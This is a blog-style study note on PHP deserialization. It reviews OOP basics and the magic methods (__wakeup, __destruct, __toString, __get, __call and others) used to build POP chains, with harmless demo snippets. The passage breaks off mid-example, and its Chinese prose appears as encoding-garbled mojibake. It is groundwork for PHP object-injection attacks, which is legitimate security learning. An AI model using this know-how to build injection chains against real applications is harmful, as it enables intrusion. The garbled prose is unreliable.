    <content><![CDATA[<h1 id="PHPååºåˆ—åŒ–å­¦ä¹ "><a href="#PHPååºåˆ—åŒ–å­¦ä¹ " class="headerlink" title="PHPååºåˆ—åŒ–å­¦ä¹ "></a>PHPååºåˆ—åŒ–å­¦ä¹ </h1><h2 id="å…¥é—¨ä¹‹å‰"><a href="#å…¥é—¨ä¹‹å‰" class="headerlink" title="å…¥é—¨ä¹‹å‰"></a>å…¥é—¨ä¹‹å‰</h2><p>é¦–å…ˆè¦çŸ¥é“PHPæ˜¯ä¸€é—¨é¢å‘å¯¹è±¡çš„è¯­è¨€</p>
<p>æ‰€ä»¥ä¼šç¢°åˆ°ç±»ï¼Œå¯¹è±¡ä¹‹ç±»çš„æ¦‚å¿µ</p>
<p>ç¨å¾®è¡¥å……ä¸€ç‚¹ç½¢ï¼Œä¸ç„¶ä¼šå¬ä¸æ‡‚çš„()</p>
<ul>
<li><strong>ç±»</strong> âˆ’ å®šä¹‰äº†ä¸€ä»¶äº‹ç‰©çš„æŠ½è±¡ç‰¹ç‚¹ã€‚ç±»çš„å®šä¹‰åŒ…å«äº†æ•°æ®çš„å½¢å¼ä»¥åŠå¯¹æ•°æ®çš„æ“ä½œã€‚</li>
<li><strong>å¯¹è±¡</strong> âˆ’ æ˜¯ç±»çš„å®ä¾‹ã€‚</li>
<li><strong>æˆå‘˜å˜é‡</strong> âˆ’ å®šä¹‰åœ¨ç±»å†…éƒ¨çš„å˜é‡ã€‚è¯¥å˜é‡çš„å€¼å¯¹å¤–æ˜¯ä¸å¯è§çš„ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡æˆå‘˜å‡½æ•°è®¿é—®ï¼Œåœ¨ç±»è¢«å®ä¾‹åŒ–ä¸ºå¯¹è±¡åï¼Œè¯¥å˜é‡å³å¯æˆä¸ºå¯¹è±¡çš„<strong>å±æ€§</strong>ã€‚</li>
<li><strong>æˆå‘˜å‡½æ•°</strong> âˆ’ å®šä¹‰åœ¨ç±»çš„å†…éƒ¨ï¼Œå¯ç”¨äºè®¿é—®å¯¹è±¡çš„æ•°æ®ã€‚</li>
<li><strong>ç»§æ‰¿</strong> âˆ’ ç»§æ‰¿æ€§æ˜¯å­ç±»è‡ªåŠ¨å…±äº«çˆ¶ç±»æ•°æ®ç»“æ„å’Œæ–¹æ³•çš„æœºåˆ¶ï¼Œè¿™æ˜¯ç±»ä¹‹é—´çš„ä¸€ç§å…³ç³»ã€‚åœ¨å®šä¹‰å’Œå®ç°ä¸€ä¸ªç±»çš„æ—¶å€™ï¼Œå¯ä»¥åœ¨ä¸€ä¸ªå·²ç»å­˜åœ¨çš„ç±»çš„åŸºç¡€ä¹‹ä¸Šæ¥è¿›è¡Œï¼ŒæŠŠè¿™ä¸ªå·²ç»å­˜åœ¨çš„ç±»æ‰€å®šä¹‰çš„å†…å®¹ä½œä¸ºè‡ªå·±çš„å†…å®¹ï¼Œå¹¶åŠ å…¥è‹¥å¹²æ–°çš„å†…å®¹ã€‚</li>
<li><strong>çˆ¶ç±»</strong> âˆ’ ä¸€ä¸ªç±»è¢«å…¶ä»–ç±»ç»§æ‰¿ï¼Œå¯å°†è¯¥ç±»ç§°ä¸ºçˆ¶ç±»ï¼Œæˆ–åŸºç±»ï¼Œæˆ–è¶…ç±»ã€‚</li>
<li><strong>å­ç±»</strong> âˆ’ ä¸€ä¸ªç±»ç»§æ‰¿å…¶ä»–ç±»ç§°ä¸ºå­ç±»ï¼Œä¹Ÿå¯ç§°ä¸ºæ´¾ç”Ÿç±»ã€‚</li>
<li><strong>å¤šæ€</strong> âˆ’ å¤šæ€æ€§æ˜¯æŒ‡ç›¸åŒçš„å‡½æ•°æˆ–æ–¹æ³•å¯ä½œç”¨äºå¤šç§ç±»å‹çš„å¯¹è±¡ä¸Šå¹¶è·å¾—ä¸åŒçš„ç»“æœã€‚ä¸åŒçš„å¯¹è±¡ï¼Œæ”¶åˆ°åŒä¸€æ¶ˆæ¯å¯ä»¥äº§ç”Ÿä¸åŒçš„ç»“æœï¼Œè¿™ç§ç°è±¡ç§°ä¸ºå¤šæ€æ€§ã€‚</li>
<li><strong>é‡è½½</strong> âˆ’ ç®€å•è¯´ï¼Œå°±æ˜¯å‡½æ•°æˆ–è€…æ–¹æ³•æœ‰åŒæ ·çš„åç§°ï¼Œä½†æ˜¯å‚æ•°åˆ—è¡¨ä¸ç›¸åŒçš„æƒ…å½¢ï¼Œè¿™æ ·çš„åŒåä¸åŒå‚æ•°çš„å‡½æ•°æˆ–è€…æ–¹æ³•ä¹‹é—´ï¼Œäº’ç›¸ç§°ä¹‹ä¸ºé‡è½½å‡½æ•°æˆ–è€…æ–¹æ³•ã€‚</li>
<li><strong>æŠ½è±¡æ€§</strong> âˆ’ æŠ½è±¡æ€§æ˜¯æŒ‡å°†å…·æœ‰ä¸€è‡´çš„æ•°æ®ç»“æ„ï¼ˆå±æ€§ï¼‰å’Œè¡Œä¸ºï¼ˆæ“ä½œï¼‰çš„å¯¹è±¡æŠ½è±¡æˆç±»ã€‚ä¸€ä¸ªç±»å°±æ˜¯è¿™æ ·ä¸€ç§æŠ½è±¡ï¼Œå®ƒåæ˜ äº†ä¸åº”ç”¨æœ‰å…³çš„é‡è¦æ€§è´¨ï¼Œè€Œå¿½ç•¥å…¶ä»–ä¸€äº›æ— å…³å†…å®¹ã€‚ä»»ä½•ç±»çš„åˆ’åˆ†éƒ½æ˜¯ä¸»è§‚çš„ï¼Œä½†å¿…é¡»ä¸å…·ä½“çš„åº”ç”¨æœ‰å…³ã€‚</li>
<li><strong>å°è£…</strong> âˆ’ å°è£…æ˜¯æŒ‡å°†ç°å®ä¸–ç•Œä¸­å­˜åœ¨çš„æŸä¸ªå®¢ä½“çš„å±æ€§ä¸è¡Œä¸ºç»‘å®šåœ¨ä¸€èµ·ï¼Œå¹¶æ”¾ç½®åœ¨ä¸€ä¸ªé€»è¾‘å•å…ƒå†…ã€‚</li>
<li><strong>æ„é€ å‡½æ•°</strong> âˆ’ ä¸»è¦ç”¨æ¥åœ¨åˆ›å»ºå¯¹è±¡æ—¶åˆå§‹åŒ–å¯¹è±¡ï¼Œ å³ä¸ºå¯¹è±¡æˆå‘˜å˜é‡èµ‹åˆå§‹å€¼ï¼Œæ€»ä¸newè¿ç®—ç¬¦ä¸€èµ·ä½¿ç”¨åœ¨åˆ›å»ºå¯¹è±¡çš„è¯­å¥ä¸­ã€‚</li>
<li><strong>ææ„å‡½æ•°</strong> âˆ’ ææ„å‡½æ•°(destructor) ä¸æ„é€ å‡½æ•°ç›¸åï¼Œå½“å¯¹è±¡ç»“æŸå…¶ç”Ÿå‘½å‘¨æœŸæ—¶ï¼ˆä¾‹å¦‚å¯¹è±¡æ‰€åœ¨çš„å‡½æ•°å·²è°ƒç”¨å®Œæ¯•ï¼‰ï¼Œç³»ç»Ÿè‡ªåŠ¨æ‰§è¡Œææ„å‡½æ•°ã€‚ææ„å‡½æ•°å¾€å¾€ç”¨æ¥åšâ€æ¸…ç†å–„åâ€ çš„å·¥ä½œï¼ˆä¾‹å¦‚åœ¨å»ºç«‹å¯¹è±¡æ—¶ç”¨newå¼€è¾Ÿäº†ä¸€ç‰‡å†…å­˜ç©ºé—´ï¼Œåº”åœ¨é€€å‡ºå‰åœ¨ææ„å‡½æ•°ä¸­ç”¨deleteé‡Šæ”¾ï¼‰ã€‚</li>
</ul>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;<span class="comment">//ç±»</span>
  <span class="comment">/* æˆå‘˜å˜é‡ */</span>
  <span class="keyword">var</span> <span class="variable">$url</span>;
  <span class="keyword">var</span> <span class="variable">$title</span>;
  
  <span class="comment">/* æˆå‘˜å‡½æ•° */</span>
  <span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;
     <span class="variable language_">$this</span>-&gt;url = <span class="variable">$par</span>;
  &#125;
  
  <span class="function"><span class="keyword">function</span> <span class="title">getUrl</span>(<span class="params"></span>)</span>&#123;
     <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;url . PHP_EOL;
  &#125;
  
  <span class="function"><span class="keyword">function</span> <span class="title">setTitle</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;
     <span class="variable language_">$this</span>-&gt;title = <span class="variable">$par</span>;
  &#125;
  
  <span class="function"><span class="keyword">function</span> <span class="title">getTitle</span>(<span class="params"></span>)</span>&#123;
     <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;title . PHP_EOL;
  &#125;
&#125;
<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Site</span>();<span class="comment">//åˆ›å»ºå¯¹è±¡</span>
<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">setTitle</span>(<span class="string">&#x27;AyaN0&#x27;</span>);<span class="comment">//è°ƒç”¨æˆå‘˜æ–¹æ³•</span>
<span class="comment">//æˆ–è€…$a-&gt;setTitle=&#x27;AyaN0&#x27;;</span>

<span class="meta">?&gt;</span></code></pre>

<h2 id="popé“¾æ„é€ "><a href="#popé“¾æ„é€ " class="headerlink" title="popé“¾æ„é€ "></a>popé“¾æ„é€ </h2><h3 id="construct-å’Œ-destruct"><a href="#construct-å’Œ-destruct" class="headerlink" title="__construct() å’Œ __destruct()"></a><code>__construct()</code> å’Œ <code>__destruct()</code></h3><p><code>__construct</code>ï¼šå½“å¯¹è±¡<strong>åˆ›å»º</strong>æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ï¼Œæ³¨æ„æ˜¯åˆ›å»ºçš„æ—¶å€™ï¼Œä¹Ÿå°±æ˜¯è¯´æœ‰<code>new</code>çš„æ—¶å€™å°±ä¼šè°ƒç”¨ï¼Œåœ¨<code>unserialize</code>æ—¶æ˜¯ä¸ä¼šè¢«è‡ªåŠ¨è°ƒç”¨çš„</p>
<pre><code class="highlight plaintext">__destruct()`ï¼šå½“å¯¹è±¡è¢«é”€æ¯æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ï¼›å½“æ–°å¯¹è±¡åˆ›å»ºåï¼Œå®ƒåé¢ä¸€å®šä¼šè¢«è‡ªåŠ¨é”€æ¯ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨`__construct`åä¸€å®šä¼šè°ƒç”¨`__destruct`ï¼›æˆ–è€…æˆ‘ä»¬ç›´æ¥ä¼ å…¥ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒåé¢è¢«é”€æ¯æ—¶ä¹Ÿä¼šè°ƒç”¨`__destruct</code></pre>

<p>å¯ä»¥çœ‹åˆ°ï¼Œåˆ›å»ºå¯¹è±¡eæ—¶è°ƒç”¨äº†<code>__construct</code>ï¼Œç„¶åè¾“å‡ºåºåˆ—åŒ–åçš„å¯¹è±¡<code>t</code>ï¼Œæœ€ååœ¨é”€æ¯å¯¹è±¡<code>t</code>æ—¶è°ƒç”¨äº†<code>__destruct</code></p>
<ul>
<li><p>å®ä¾‹</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;

    <span class="keyword">public</span> <span class="variable">$username</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;
        <span class="keyword">echo</span> <span class="string">&quot;__construct test&quot;</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;F0rmat&quot;</span>);
<span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);
<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);
<span class="meta">?&gt;</span>
<span class="comment">//__construct test</span></code></pre>

<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">echo</span> <span class="string">&quot;__destruct test&lt;/br&gt;&quot;</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);
<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);
<span class="meta">?&gt;</span>
<span class="comment">//__destruct test</span>
<span class="comment">//__destruct test</span></code></pre></li>
</ul>
<h3 id="sleep-å’Œ-wakeup"><a href="#sleep-å’Œ-wakeup" class="headerlink" title="__sleep() å’Œ __wakeup()"></a><code>__sleep()</code> å’Œ <code>__wakeup()</code></h3><p><code>__sleep()</code> ï¼šåœ¨å¯¹è±¡è¢«åºåˆ—åŒ–<strong>ä¹‹å‰</strong>è¢«è°ƒç”¨ï¼Œå°±æ˜¯è¯´çœ‹åˆ°<code>serialize</code>æ—¶å°±ä¼šè¢«è°ƒç”¨ï¼Œè€Œä¸”æ˜¯å…ˆè°ƒç”¨åå†æ‰§è¡Œåºåˆ—åŒ–</p>
<p><code>__wakeup()</code>: å°†åœ¨<strong>å­—ç¬¦ä¸²è¢«ååºåˆ—åŒ–ä¹‹åè¢«ç«‹å³è°ƒç”¨</strong>ï¼Œå°±æ˜¯è¯´<strong>çœ‹åˆ°</strong><code>unserialize</code><strong>åå°±ä¼šè¢«ç«‹å³è°ƒç”¨</strong></p>
<p>åœ¨çœ‹åˆ°<code>serialize($b)</code>åï¼Œå®ƒæ˜¯å…ˆè°ƒç”¨äº†<code>__sleep()</code>é­”æ³•å‡½æ•°ï¼Œç„¶åæ‰æ‰§è¡Œäº†<code>echo</code>ï¼Œè¾“å‡ºäº†å­—ç¬¦ä¸²</p>
<p>ç›´æ¥è¾“å…¥äº†<strong>å­—ç¬¦ä¸²</strong>ï¼Œå½“å®ƒæ‰§è¡Œäº†<code>unserialize</code>è½¬æ¢æˆå¯¹è±¡åï¼Œå°±ä¼šæœ€å…ˆè°ƒç”¨<code>__wakeup()</code>ï¼Œå®ƒçš„ä¼˜å…ˆçº§æœ€é«˜</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;

    <span class="keyword">public</span> <span class="variable">$username</span>;
    <span class="keyword">public</span> <span class="variable">$nickname</span>;
    <span class="keyword">private</span> <span class="variable">$password</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;
        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;
        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;
    &#125;

    <span class="comment">// é‡è½½åºåˆ—åŒ–è°ƒç”¨çš„æ–¹æ³•</span>
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>
<span class="function">    </span>&#123;
        <span class="comment">// è¿”å›éœ€è¦åºåˆ—åŒ–çš„å˜é‡åï¼Œè¿‡æ»¤æ‰passwordå˜é‡</span>
        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;nickname&#x27;</span>);
    &#125;

&#125;
<span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);
<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);
<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;ç»“æœå°±æ˜¯è¿‡æ»¤æ‰äº†passwordçš„å€¼</span></code></pre>

<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;

    <span class="keyword">public</span> <span class="variable">$username</span>;
    <span class="keyword">public</span> <span class="variable">$nickname</span>;
    <span class="keyword">private</span> <span class="variable">$password</span>;
    <span class="keyword">private</span> <span class="variable">$order</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;
        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;
        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;
    &#125;

    <span class="comment">// å®šä¹‰ååºåˆ—åŒ–åè°ƒç”¨çš„æ–¹æ³•</span>
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>
<span class="function">    </span>&#123;
        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;username;
    &#125;
&#125;
<span class="variable">$user_ser</span> = <span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;
<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>));
<span class="comment">/*</span>
<span class="comment">class User#1 (4) &#123;</span>
<span class="comment">  public $username =&gt;</span>
<span class="comment">  string(1) &quot;a&quot;</span>
<span class="comment">  public $nickname =&gt;</span>
<span class="comment">  string(1) &quot;b&quot;</span>
<span class="comment">  private $password =&gt;</span>
<span class="comment">  string(1) &quot;a&quot;</span>
<span class="comment">  private $order =&gt;</span>
<span class="comment">  NULL</span>
<span class="comment">&#125;</span>
<span class="comment">ä¸Šé¢wakeupçš„å‡½æ•°ä½œç”¨æ˜¯å°†usernameçš„å˜é‡å€¼èµ‹å€¼ç»™passwordå˜é‡ã€‚*/</span></code></pre>



<h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a><code>__toString()</code></h3><p><code>__toString()</code>é­”æœ¯æ–¹æ³•æ˜¯æœ€ä¸ºæœ€è¦çš„ï¼Œåœ¨æ„é€ popé“¾ä¸­å®ƒå¾€å¾€æ˜¯å¾ˆå…³é”®çš„ä¸€ç¯ï¼Œåœ¨å¾ˆå¤šç§æƒ…å†µä¸‹éƒ½ä¼šè¢«è°ƒç”¨ï¼Œä¸»è¦æ˜¯ä¸‹é¢è¿™äº›ï¼š</p>
<ol>
<li><code>echo($obj)</code>æˆ–<code>print($obj)</code><strong>æ‰“å°å¯¹è±¡</strong>æ—¶ä¼šè§¦å‘</li>
<li><strong>ååºåˆ—åŒ–å¯¹è±¡</strong>ä¸å­—ç¬¦ä¸²è¿æ¥æ—¶</li>
<li><strong>ååºåˆ—åŒ–å¯¹è±¡</strong>å‚ä¸æ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶</li>
<li><strong>ååºåˆ—åŒ–å¯¹è±¡</strong>ä¸<strong>å­—ç¬¦ä¸²</strong>è¿›è¡Œ<code>preg_match</code>æ­£åˆ™åŒ¹é…)ï¼Œå› ä¸ºphpè¿›è¡Œå¼±æ¯”è¾ƒæ—¶ä¼šè½¬æ¢å‚æ•°ç±»å‹ï¼Œç›¸å½“äºéƒ½è½¬æ¢æˆå­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒ</li>
<li><strong>ååºåˆ—åŒ–å¯¹è±¡</strong>å‚ä¸<strong>æ ¼å¼åŒ–sqlè¯­å¥</strong>æ—¶ï¼Œç»‘å®šå‚æ•°æ—¶(ç”¨çš„å°‘)</li>
<li><strong>ååºåˆ—åŒ–å¯¹è±¡</strong>ç»è¿‡<strong>phpå­—ç¬¦ä¸²å‡½æ•°</strong>æ—¶ï¼Œå¦‚<code>strlen()</code>ï¼Œ<code>addslashes()</code>æ—¶(ç”¨çš„å°‘)</li>
<li>åœ¨<code>in_array()</code>æ–¹æ³•ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯<strong>ååºåˆ—åŒ–å¯¹è±¡</strong>ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„æ•°ç»„ä¸­æœ‰<code>tostring</code>è¿”å›çš„å­—ç¬¦ä¸²çš„æ—¶å€™<code>tostring</code>ä¼šè¢«è°ƒç”¨</li>
<li><strong>ååºåˆ—åŒ–å¯¹è±¡</strong>ä½œä¸º<code>class_exists()</code>çš„å‚æ•°çš„æ—¶å€™(ç”¨çš„å°‘)</li>
</ol>
<p>é€šè¿‡çœ‹å®ƒè¢«è°ƒç”¨çš„æƒ…å†µï¼Œä¸éš¾æ€»ç»“å‡ºï¼Œå½“å¯¹è±¡è¢«å½“æˆäº†å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œ<code>__toString()</code>å°±ä¼šè¢«è°ƒç”¨ï¼Œæ— è®ºæ˜¯å°†å¯¹è±¡æ‰“å°å‡ºæ¥ï¼Œè¿˜æ˜¯å°†å¯¹è±¡å»ä¸å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒéƒ½ä¼šè¢«è°ƒç”¨ï¼›è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œå¿…é¡»è¦æ“ä½œçš„æ˜¯<strong>å¯¹è±¡</strong>çš„æ—¶å€™ï¼Œæ‰ä¼šè¢«è°ƒç”¨</p>
<p>æ–°å»ºäº†å¯¹è±¡<code>t</code>å°±ç›´æ¥æ‰“å°å®ƒï¼Œç…§ç†è¯´è‚¯å®šæ˜¯ä¸ä¼šæœ‰ä»»ä½•å›æ˜¾çš„ï¼Œå› ä¸ºåªæœ‰å­—ç¬¦ä¸²èƒ½è¢«æ‰“å°ï¼Œå¯¹è±¡è‚¯å®šæ˜¯ä¸èƒ½è¢«ç›´æ¥æ‰“å°çš„ï¼Œéœ€è¦å…ˆå°†å®ƒåºåˆ—åŒ–æˆå­—ç¬¦ä¸²åæ‰å¯ä»¥æ‰“å°ï¼›ä½†æˆ‘ä»¬è¿™ç›´æ¥æ‰“å°å‘ç°å®ƒå±…ç„¶æœ‰è¾“å‡ºï¼Œå°±æ˜¯å› ä¸ºå®ƒæŒ‰ç…§æ“ä½œå­—ç¬¦ä¸²çš„æ–¹æ³•å»æ“ä½œäº†å¯¹è±¡ï¼Œæ‰€ä»¥è¯´è°ƒç”¨äº†<code>__toString()</code>ï¼Œç„¶åå°†å®ƒçš„è¿”å›å€¼è¾“å‡ºäº†å‡ºæ¥</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>
<span class="function">    </span>&#123;
       <span class="keyword">return</span> <span class="string">&#x27;__toString test&#x27;</span>;
    &#125;

&#125;

<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="keyword">echo</span> <span class="variable">$test</span>;
<span class="comment">//__toString</span></code></pre>



<h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a><code>__invoke()</code></h3><p><code>__invoke</code>ï¼šå½“å°è¯•ä»¥è°ƒç”¨<strong>å‡½æ•°</strong>çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ª<strong>å¯¹è±¡</strong>æ—¶ï¼Œ<code>__invoke()</code>æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ï¼Œè€Œè°ƒç”¨å‡½æ•°çš„æ–¹å¼å°±æ˜¯åœ¨åé¢åŠ ä¸Š<code>()</code>ï¼Œå½“æˆ‘ä»¬çœ‹åˆ°åƒ<code>return $function();</code>è¿™ç§è¯­å¥æ—¶ï¼Œå°±åº”è¯¥æ„è¯†åˆ°åé¢å¯èƒ½ä¼šè°ƒç”¨<code>__invoke()</code>ï¼Œä¸‹å›¾æ˜¯ç›´æ¥åœ¨å¯¹è±¡åé¢åŠ <code>()</code>è°ƒç”¨</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªé­”æœ¯æ–¹æ³•åªåœ¨<strong>PHP 5.3.0 åŠä»¥ä¸Šç‰ˆæœ¬</strong>æœ‰æ•ˆ</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>
<span class="function">    </span>&#123;
       <span class="keyword">echo</span> <span class="string">&#x27;__invoke test&#x27;</span>;
    &#125;

&#125;

<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="variable">$test</span>();
<span class="comment">//__invoke test</span></code></pre>



<h3 id="get-å’Œ-set"><a href="#get-å’Œ-set" class="headerlink" title="__get() å’Œ __set()"></a><code>__get()</code> å’Œ <code>__set()</code></h3><p><code>__get()</code>ï¼šä»<strong>ä¸å¯è®¿é—®çš„å±æ€§ä¸­</strong>è¯»å–å€¼ï¼Œæˆ–è€…è¯´æ˜¯<strong>è°ƒç”¨ä¸€ä¸ªç±»åŠå…¶çˆ¶ç±»æ–¹æ³•ä¸­æœªå®šä¹‰å±æ€§æ—¶</strong>ï¼Œéœ€è¦ä¸€ä¸ªå‚æ•°ï¼Œä»£è¡¨ä¸å­˜åœ¨çš„å±æ€§å€¼</p>
<p><code>__set()</code>ï¼šå½“ç»™ä¸€ä¸ªæœªå®šä¹‰çš„å±æ€§èµ‹å€¼æ—¶ï¼Œæˆ–è€…ä¿®æ”¹ä¸€ä¸ªä¸èƒ½è¢«ä¿®æ”¹çš„å±æ€§æ—¶(<code>private</code> <code>protected</code>)(ç”¨çš„ä¸å¤š)</p>
<p><code>echo</code>è¯­å¥è°ƒç”¨äº†<code>__toString()</code>ï¼Œç„¶åå®ƒè¿”å›çš„æ˜¯å½“å‰å¯¹è±¡çš„<code>t</code>å±æ€§ï¼Œä½†æˆ‘ä»¬æ˜¯æ²¡æœ‰å®šä¹‰<code>t</code>è¿™ä¸ªå±æ€§çš„ï¼Œæ‰€ä»¥è¯´ä¼šè°ƒç”¨<code>__get()</code>ï¼Œç„¶åå°†è¿”å›å€¼æ‰“å°å‡ºæ¥</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$var1</span>;
    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">echo</span> <span class="variable">$arg1</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="variable">$test</span>-&gt;var2;
<span class="meta">?&gt;</span>
    <span class="comment">//var2</span></code></pre>

<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$var1</span>;
    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">echo</span> <span class="variable">$arg1</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$arg2</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="variable">$test</span>-&gt;var2=<span class="number">1</span>;
<span class="meta">?&gt;</span></code></pre>



<h3 id="call-å’Œ-callStatic"><a href="#call-å’Œ-callStatic" class="headerlink" title="__call() å’Œ __callStatic()"></a><code>__call()</code> å’Œ <code>__callStatic()</code></h3><p><code>__call</code>ï¼šåœ¨å¯¹è±¡ä¸­è°ƒç”¨ç±»ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ï¼Œæˆ–è€…æ˜¯ä¸å¯è®¿é—®æ–¹æ³•æ—¶è¢«è°ƒç”¨</p>
<p><code>__callStatic</code>ï¼šåœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®é™æ€æ–¹æ³•æ—¶è¢«è°ƒç”¨(ç”¨çš„ä¸å¤š)</p>
<p>æ¯”å¦‚è¯´åƒè¿™æ®µä»£ç ï¼Œæˆ‘ä»¬è°ƒç”¨å¯¹è±¡<code>t</code>ä¸­çš„æ–¹æ³•<code>t2</code>ï¼Œä½†å› ä¸ºç±»ä¸­æ²¡æœ‰æ–¹æ³•<code>t2</code>ï¼Œæ‰€ä»¥è¯´å°±è°ƒç”¨äº†<code>__call()</code></p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>
<span class="function">    </span>&#123;
